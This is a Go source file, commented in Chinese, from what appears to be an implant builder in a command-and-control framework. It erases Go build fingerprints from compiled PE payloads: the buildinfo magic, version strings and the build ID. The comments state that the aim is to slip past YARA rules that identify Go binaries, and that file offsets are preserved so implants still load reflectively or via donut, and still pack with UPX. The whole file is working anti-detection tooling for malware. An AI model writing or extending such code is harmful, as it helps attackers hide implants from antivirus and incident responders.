package builder

import (
	"bytes"
	"fmt"
)

// PE 指纹擦除（构建期加固）：把 Go 链接器写进二进制、**运行时一律用不到**的
// "Go 家族"构建期特征就地抹掉。这是 YARA 的 Go 家族识别规则最常命中的三类目标：
//
//  1. buildinfo 魔数 "\xff Go buildinf:"（14 字节，链接器的 buildInfoMagic，
//     garble 改了节名（.go.buildinfo → 随机名）也依然保留）+ 紧随的 2 字节
//     （指针宽度 / 是否大端）＝ 16 字节头；
//  2. buildinfo 块里内联的 Go 版本串。Go 1.18+ 的新格式实测为：
//     16 字节头 + 16 字节保留字（两个指针字，新格式下为 0）+ 变长长度前缀 + "go1.x.y"
//     （32/64 位都是版本串紧跟在第 33 字节），Go 1.12~1.17 的旧格式则是两个指针；
//  3. PE 头填充区里的一行 `Go build ID: "<base64url ID>"`（链接器在文件头之后、
//     第一个节数据之前写下，实测位于偏移 0x600 附近的零填充区）。
//
// # 为什么这些擦除是安全的（运行时都不用）
//
//   - buildinfo 块只被 debug/buildinfo 解析，也就是 debug.ReadBuildInfo 与
//     `go version -m <file>` 这两条"事后取证"路径；运行时调度器、GC、栈回溯、
//     panic 打印、moduledata 初始化全都不读它。擦掉它的代价是 `go version -m`
//     与 debug.ReadBuildInfo 退化为"没有构建信息"，对植入体行为零影响。
//   - `Go build ID: "…"` 本质是链接动作 ID 的 base64，只被 `go tool buildid`
//     用来做构建缓存命中判断，程序运行完全不用它；连同引号内的 ID 一起置零，
//     是为了顺手消掉 ID 本身的形态特征（见 scrubGoBuildIDs 的注释）。
//   - 版本串只在"魔数之后 512 字节窗口内"才擦：panic / `go version` 走的是
//     runtime.buildVersion 指向的**另一处**只读字符串（实测在 .rodata，离魔数
//     上兆字节），本函数故意不动它，避免误伤无关字符串；窗口限定同时也保证
//     不会擦到恰好形如 "go1.x" 的业务字符串。
//
// # 为什么绝对不能动 pclntab / 符号表
//
//   - pclntab（.gopclntab：funcnametab / pctab / funcdata / 文件名表）是 Go runtime
//     的**运行期核心数据**：栈回溯、panic 打印、GC 的栈对象位图、runtime 按名字
//     找函数都要读它，改坏会让植入体当场崩溃；而且它体量大、结构自引用，改名/
//     重排是 garble 的职责（garble 会整体重写并在运行期用同一个表），
//     本函数只做"链接器构建期元数据"这一最小集合，绝不越权。
//   - COFF 符号表 / .debug_* / DWARF 同理：要么链接期就被 -s -w 剥掉了，
//     要么由 garble 处理；这里碰它们既没收益又容易破坏可用性。
//   - 构建期固定串 `go:buildid` / `runtime.*` 同样**故意不处理**：前者是链接器生成的
//     构建 ID 符号名（实测在 PE 里只出现一次，与 pclntab / 符号表关联），后者是运行时
//     符号名，二者都属于上面这一类；本函数只处理三类链接器元数据，绝不做过度擦除。
//
// # 为什么必须保持长度不变
//
// 擦除是**原地覆盖**（命中的字节写 0x00），绝不 insert / delete：
//   - PE 的节表（PointerToRawData / SizeOfRawData / VirtualAddress）、数据目录 RVA、
//     重定位项、校验和全都按文件偏移预先算好；长度一变这些偏移整体错位，
//     镜像直接不可加载（反射加载 / donut / 落地执行都会失败）；
//   - 调用点还要求它跑在 UPX **之前**（UPX 会重新打包出全新布局，压缩后再擦没有意义）。
//
// # 已知边界（因此不要把本函数用在服务端自身二进制上）
//
// 匹配是纯字节级的：builder 包的 pecheck.go 自己也把这两类标记当字符串常量编译进了
// 服务端二进制（DetectGoBinary 的标记表），对服务端 exe 跑本函数会顺手清掉那几个
// 常量、破坏 DetectGoBinary。调用点只有植入端 compile()，服务端产物不要调用。
// 同理，若植入体里嵌了恰好含 "Go build ID:" 文本的载荷（例如内嵌的 Go 程序源码），
// 那 12 字节前缀也会被原地置零；实测当前 release/implants 下的植入端产物不含该串。
//
// 纯函数约束：不改入参（永远返回新切片）、无 IO、无第三方依赖（只用标准库），
// 对 PE 与任意二进制都安全（没有标记时原样返回副本），天然幂等。
const (
	// goBuildInfoHeaderLen buildinfo 头长度：14 字节魔数 + 指针宽度 + 大端标志。
	goBuildInfoHeaderLen = 16
	// goBuildInfoWindow 魔数之后搜索版本串的窗口大小（字节）。
	goBuildInfoWindow = 512
	// goBuildIDPrefix PE 头填充区里的构建标识前缀。
	goBuildIDPrefix = "Go build ID:"
	// goBuildIDMaxQuotedLen 引号内 ID 的长度上限（实测约 96，留足余量）。
	goBuildIDMaxQuotedLen = 256
)

// ScrubGoFingerprint 原地擦除 Go 编译特征（保持长度不变，供后续 PE 结构不变）。
// 返回擦除后的副本与被擦除项的中文说明（用于构建日志）。
//
// 入参 bin 永不被修改；out 与 bin 长度完全一致；removed 为空表示没找到任何特征
// （输入干净，或此前已被本函数擦过 —— 因此可安全重复调用）。
func ScrubGoFingerprint(bin []byte) (out []byte, removed []string) {
	// 永远返回独立副本：调用方后续可能继续改 out，不能和入参共享底层数组。
	out = make([]byte, len(bin))
	copy(out, bin)
	if len(out) == 0 {
		return out, nil
	}

	// ── 第一类 + 第二类：buildinfo 魔数，以及紧随其后的版本串 ──
	// 用 out 做扫描基底：每处理完一处就把 16 字节头写成 0，所以循环不会重复命中，
	// 幂等性也由此保证。
	magic := []byte(goBuildInfoMagic) // "\xff Go buildinf:"，常量定义见 pecheck.go
	for search := 0; search+len(magic) <= len(out); {
		i := bytes.Index(out[search:], magic)
		if i < 0 {
			break
		}
		at := search + i

		// 1) 清零 16 字节魔数区（14 字节魔数 + 指针宽度/大端标志）。其后的内容保留：
		// 版本串与 module 信息在窗口规则里单独处理，避免"一擦一大片"误伤。
		headEnd := at + goBuildInfoHeaderLen
		if headEnd > len(out) {
			headEnd = len(out) // 文件尾部被截断的魔数：能清多少清多少
		}
		zeroRange(out, at, headEnd)
		removed = append(removed, fmt.Sprintf(
			"Go buildinf 魔数（偏移 0x%x，清零 %d 字节头）", at, headEnd-at))

		// 2) 魔数 16 字节头之后 512 字节窗口内的 Go 版本串。
		winStart := at + goBuildInfoHeaderLen
		winEnd := winStart + goBuildInfoWindow
		if winEnd > len(out) {
			winEnd = len(out)
		}
		if winStart < winEnd {
			removed = append(removed, scrubGoVersions(out, winStart, winEnd, "buildinfo 窗口内")...)
		}

		search = at + len(magic)
	}

	// ── 第三类：PE 头填充区的 `Go build ID: "…"` ──
	removed = append(removed, scrubGoBuildIDs(out)...)

	return out, removed
}

// scrubGoVersions 把 [start,end) 窗口内形如 go1.<数字/点> 的版本串用 0x00 覆盖，
// 返回中文说明。窗口内可能有多个（版本串 + module 信息区），全部处理。
// where 只用于日志文案（"buildinfo 窗口内" / "全文件"），便于事后区分是谁清掉的。
func scrubGoVersions(buf []byte, start, end int, where string) []string {
	var removed []string
	prefix := []byte("go1.")
	for i := start; i < end; {
		j := bytes.Index(buf[i:end], prefix)
		if j < 0 {
			break
		}
		at := i + j
		k := at + len(prefix)
		// 必须紧跟数字：排除 "go1.x" / "go1." 这类普通文本，避免误伤。
		if k >= end || !isASCIIDigit(buf[k]) {
			i = at + 1
			continue
		}
		for k < end && (isASCIIDigit(buf[k]) || buf[k] == '.') {
			k++
		}
		// 回退收尾的点号：窗口里若恰好是句末的 "go1.20.14." 不应把句号也清掉。
		for k > at+len(prefix) && buf[k-1] == '.' {
			k--
		}
		ver := string(buf[at:k])
		zeroRange(buf, at, k)
		removed = append(removed, fmt.Sprintf(
			"%s的 Go 版本串 %q（偏移 0x%x，置零）", where, ver, at))
		i = k
	}
	return removed
}

// ScrubGoVersionStrings 全文件扫描并清零形如 go1.<数字> 的版本串（长度不变，幂等）。
//
// 为什么需要它（v1.4.0 S3 实测发现，exe 与 dll 都有）：`ScrubGoFingerprint` 里版本串的
// 擦除范围是**锚在 buildinfo 魔数之后 512 字节窗口**内的，而 Go 运行时另有一份版本串
// （`runtime.buildVersion`，`runtime.Version()` 读的就是它）落在别处的只读数据段里，
// 锚定窗口扫不到。实测 windows/386 构建产物（擦除前魔数/Build ID 都在，擦除后它们归零）：
//
//	format=exe  魔数 0、Go build ID 0、go1.20.14 仍命中 1 次   ← 漏
//	format=dll  魔数 0、Go build ID 0、go1.20.14 仍命中 1 次   ← 漏（且 dll 路径此前压根没做擦除）
//
// 于是补一次"全文件版本串擦除"。匹配规则与窗口版**完全一致**（`go1.` 必须紧跟数字，
// 且回退收尾的点号），因此不会误伤 "go1.x"、"go1." 这类普通文本；只清零、长度不变，
// 所以 PE 节表/重定位/校验和全不受影响。
//
// 安全性：植入端模板不调用 `runtime.Version()`/`Debug.ReadBuildInfo()`（已核对
// internal/server/builder/implant 与 release/implant），清零只影响运行时崩溃/诊断输出
// 里的版本信息 —— 那正是我们要消掉的特征。
func ScrubGoVersionStrings(bin []byte) (out []byte, removed []string) {
	out = make([]byte, len(bin))
	copy(out, bin)
	if len(out) == 0 {
		return out, nil
	}
	return out, scrubGoVersions(out, 0, len(out), "全文件")
}

// scrubGoBuildIDs 把 `Go build ID:` 前缀置零。
//
// 选择：前缀之后若是链接器的规范形态 ` "<base64url ID>"\n`，则**连同引号内的 ID
// 与行尾换行一起**置零（ID 只服务 `go tool buildid` 的构建缓存，运行时同样不需要，
// 清掉可额外消掉 ID 本身的形态特征）；若不是规范形态（比如紧跟别的数据），
// 则只清 12 字节前缀，绝不越界多擦。
func scrubGoBuildIDs(buf []byte) []string {
	var removed []string
	prefix := []byte(goBuildIDPrefix)
	for i := 0; i+len(prefix) <= len(buf); {
		j := bytes.Index(buf[i:], prefix)
		if j < 0 {
			break
		}
		at := i + j
		end := at + len(prefix)
		detail := "仅前缀，后续内容非规范 ID 形态、保持原样"
		if q, ok := goBuildIDQuotedEnd(buf, end); ok {
			end = q
			detail = "含引号内的 ID 与行尾换行"
		}
		zeroRange(buf, at, end)
		removed = append(removed, fmt.Sprintf(
			"Go build ID 串（偏移 0x%x，清零 %d 字节：%s）", at, end-at, detail))
		i = at + len(prefix)
	}
	return removed
}

// goBuildIDQuotedEnd 判断 from 起是否为 ` "<ID>"` 形式（前缀与引号之间允许一个空格，
// 引号后允许一个换行），是则返回整行的结束偏移；否则返回 false。
func goBuildIDQuotedEnd(buf []byte, from int) (int, bool) {
	i := from
	if i < len(buf) && buf[i] == ' ' {
		i++
	}
	if i >= len(buf) || buf[i] != '"' {
		return 0, false
	}
	i++
	idStart := i
	for i < len(buf) && i-idStart <= goBuildIDMaxQuotedLen && isGoBuildIDChar(buf[i]) {
		i++
	}
	if i >= len(buf) || i == idStart || buf[i] != '"' {
		return 0, false
	}
	i++ // 收尾引号
	if i < len(buf) && buf[i] == '\n' {
		i++
	}
	return i, true
}

// isGoBuildIDChar Go 构建 ID 的字符集（base64url 四段，用 / 分隔，可能带 + = 填充）。
func isGoBuildIDChar(c byte) bool {
	switch {
	case c >= 'A' && c <= 'Z', c >= 'a' && c <= 'z', c >= '0' && c <= '9':
		return true
	case c == '_', c == '-', c == '/', c == '+', c == '=':
		return true
	default:
		return false
	}
}

// isASCIIDigit 判断是否为 ASCII 数字（避免引入 unicode 判断）。
func isASCIIDigit(c byte) bool { return c >= '0' && c <= '9' }

// zeroRange 把 buf[start:end] 就地写 0（长度不变，仅改内容）。
func zeroRange(buf []byte, start, end int) {
	if start < 0 {
		start = 0
	}
	if end > len(buf) {
		end = len(buf)
	}
	for i := start; i < end; i++ {
		buf[i] = 0
	}
}
